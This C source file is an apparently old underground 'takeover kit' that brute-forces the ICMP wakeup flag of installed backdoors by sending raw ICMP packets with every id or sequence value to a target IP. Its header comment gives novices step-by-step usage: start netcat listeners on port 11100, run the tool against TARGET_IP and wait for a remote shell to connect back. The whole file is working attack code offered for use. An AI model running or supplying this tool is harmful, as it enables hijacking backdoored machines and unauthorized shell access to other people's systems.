/**********************************************************************
 *        m00 bdpack takeover kit          [  05.01.04 23:33  ]       *
 *    ~   ~   ~   ~   ~   ~   ~   ~   ~   ~   ~   ~   ~   ~   ~   ~   *
 *      use it with netcat or somethin' else...                       *
 *                                                                    *
 * HOW-TO FOR NEWBIEZ:                                                *
 * 1] u must be root to work with raw icmp sockz!!                    *
 * 	sh#1 - 'nc -l -p 11100 -vv'                                   *
 * 	sh#2 - 'nc -u -l -p 11100 -vv'                                *
 * 	sh#3 - './fuck_iwbdz MY_IP TARGET_IP 0'                       *
 * 2] wait for shell.                                                 *
 * 3] if no shell spawned, try connect to TARGET_IP on tcp or udp     *
 * port 11100.                                                        *
 * 4] try to scan all ports on remote machine - maybe port is static. *
 * 5] if it still don't works, try other options of this tool         *
 *                                                                    *
 **********************************************************************/

#include <stdio.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>


unsigned short in_cksum(unsigned short *addr, int len)
{
    register int sum = 0;
    u_short answer = 0;
    register u_short *w = addr;
    register int nleft = len;

    while (nleft > 1)
      {
	  sum += *w++;
	  nleft -= 2;
      }
    if (nleft == 1)
      {
	  *(u_char *) (&answer) = *(u_char *) w;
	  sum += answer;
      }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);		
    answer = ~sum;		
    return (answer);
}

int main(int argc, char *argv[]){

    int sock, optval, type, port, delay, code, i, k;
    char *packet, statstr[6];
    struct icmphdr *icmp;
    struct sockaddr_in peer;
    struct iphdr *ip;
    unsigned short int flag;

    printf("[==] Anti ICMP-wakeup backdoorz t00lkit 4r0m d_staff [==]\n");

    if ( argc < 3 ){
	printf("\nUsage: %s <srcip> <dstip> [scan_delay] [start_value] [scan_type] [ICMP_type] [ICMP_code]\n", argv[0]);
	printf("  scan_type - just use 0 for standart scan\n");
	exit(0);
    }

delay=i=k=type=code=0;

    if (argc > 3)
        delay = atoi(argv[3]);

    if (argc > 4)
        i = atoi(argv[4]);

    if (argc > 5)
        k = atoi(argv[5]);

    if (argc > 6)
        type = atoi(argv[6]);

    if (argc > 7)
        code = atoi(argv[7]);

printf("[+] Settings:\n delay \x3d %i\n start_flag \x3d %i\n scan_type \x3d %i\n ICMP_type \x3d %i\n ICMP_code \x3d %i\n",delay,i,k,type,code);
sleep(1);
printf("[+] Letz go...\n");

/* nice shit here ;)) */

for ( flag=i; flag <= 65535; flag++ ){

if (flag < 16)
    sprintf(statstr,"[+] Trying flag: \x30\x78\x30\x30\x30\x25\x78\r",flag);

if ((flag >= 16) && (flag < 256))
    sprintf(statstr,"[+] Trying flag: \x30\x78\x30\x30\x25\x78\r",flag);

if ((flag >= 256) && (flag < 256*16))
    sprintf(statstr,"[+] Trying flag: \x30\x78\x30\x25\x78\r",flag);

if ((flag >= 256*16) && (flag < 256*256))
    sprintf(statstr,"[+] Trying flag: \x30\x78\x25\x78\r",flag);

write(1,statstr,strlen(statstr));

	ip = (struct iphdr *) malloc(sizeof(struct iphdr));
        icmp     = (struct icmphdr *) malloc(sizeof(struct icmphdr));
        packet  = (char *) malloc(sizeof(struct iphdr) + sizeof(struct icmphdr));

	ip = (struct iphdr *) packet;
        icmp = (struct icmphdr *) (packet + sizeof(struct iphdr));

        ip->ihl     = 5;
        ip->version = 4;
        ip->tos     = 0;
        ip->tot_len = sizeof(struct iphdr) + sizeof(struct icmphdr);
	ip->id      = htons(getuid());
	ip->ttl      = 255;
	ip->protocol = IPPROTO_ICMP;
	ip->saddr    = inet_addr(argv[1]);
	ip->daddr    = inet_addr(argv[2]);

	sock = socket(AF_INET,SOCK_RAW,IPPROTO_ICMP);
	setsockopt(sock,IPPROTO_IP,IP_HDRINCL,&optval,sizeof(int));

	icmp->type = type;
	icmp->code = code;

	if (k == 0){
		icmp->un.echo.id = flag;      
		icmp->un.echo.sequence = 0x2b5c;
	} else {
		icmp->un.echo.id = 0x2b5c;
		icmp->un.echo.sequence = flag;
	}
	icmp->checksum = 0;
        icmp->checksum = in_cksum((unsigned short *)icmp,sizeof(struct icmphdr));

        ip->check    = in_cksum((unsigned short *)ip, sizeof(struct iphdr));

	peer.sin_family = AF_INET;
	peer.sin_addr.s_addr = inet_addr(argv[2]);

	if(sendto(sock,packet,ip->tot_len,0,(struct sockaddr *)&peer,sizeof(struct sockaddr))<0)
	 {
           perror("[-] sendto()");
           exit(1);
	 }

	sleep(delay);
	close(sock);
	
	if (flag == 65535)
		break;

}

printf("[+] Done. Have a nice day!\n");
}

/* 00000w!! some code ripped from 00w-bdpack!! */
